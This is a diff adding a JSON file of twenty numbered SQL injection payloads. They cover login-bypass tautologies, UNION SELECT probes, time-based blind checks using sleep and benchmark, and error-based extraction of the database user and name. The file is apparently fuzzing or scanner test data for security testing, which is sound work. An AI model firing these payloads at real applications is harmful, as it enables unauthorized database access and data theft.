@@ -1,0 +1,23 @@
+[
+  { "id": "SQLI_1", "payload": "' OR 1=1 --" },
+  { "id": "SQLI_2", "payload": "\" OR \"1\"=\"1\" --" },
+  { "id": "SQLI_3", "payload": "' OR '1'='1'#" },
+  { "id": "SQLI_4", "payload": "' OR 1=1#" },
+  { "id": "SQLI_5", "payload": "' OR 1=1/*" },
+  { "id": "SQLI_6", "payload": "') OR ('1'='1" },
+  { "id": "SQLI_7", "payload": "' UNION SELECT NULL--" },
+  { "id": "SQLI_8", "payload": "' UNION SELECT 1,2,3--" },
+  { "id": "SQLI_9", "payload": "' UNION ALL SELECT NULL,NULL--" },
+  { "id": "SQLI_10", "payload": "' AND 1=2 UNION SELECT 1--" },
+
+  { "id": "SQLI_11", "payload": "' OR sleep(5)--" },
+  { "id": "SQLI_12", "payload": "' OR benchmark(1000000,MD5(1))--" },
+  { "id": "SQLI_13", "payload": "' AND extractvalue(1,concat(0x7e,user()))--" },
+  { "id": "SQLI_14", "payload": "' AND updatexml(1,concat(0x7e,database()),1)--" },
+  { "id": "SQLI_15", "payload": "' OR EXISTS(SELECT * FROM users)--" },
+  { "id": "SQLI_16", "payload": "' OR 'a'='a'--" },
+  { "id": "SQLI_17", "payload": "' AND 1=1--" },
+  { "id": "SQLI_18", "payload": "' OR 1=1 LIMIT 1--" },
+  { "id": "SQLI_19", "payload": "' OR 'x'='x'/*" },
+  { "id": "SQLI_20", "payload": "' OR 1=1;--" }
+]
